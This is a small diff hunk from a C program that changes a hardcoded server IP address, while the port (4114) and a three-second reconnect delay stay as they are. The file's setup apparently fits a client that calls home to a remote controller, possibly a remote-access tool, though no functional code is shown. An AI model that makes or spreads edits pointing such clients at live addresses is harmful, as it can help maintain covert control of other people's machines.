@@ -10,7 +10,7 @@
 #include <dirent.h>
 #include <sys/stat.h>
 
-#define SERVER_IP "103.157.97.9"
+#define SERVER_IP "154.18.239.136"
 #define SERVER_PORT 4114
 #define RECONNECT_DELAY 3
 
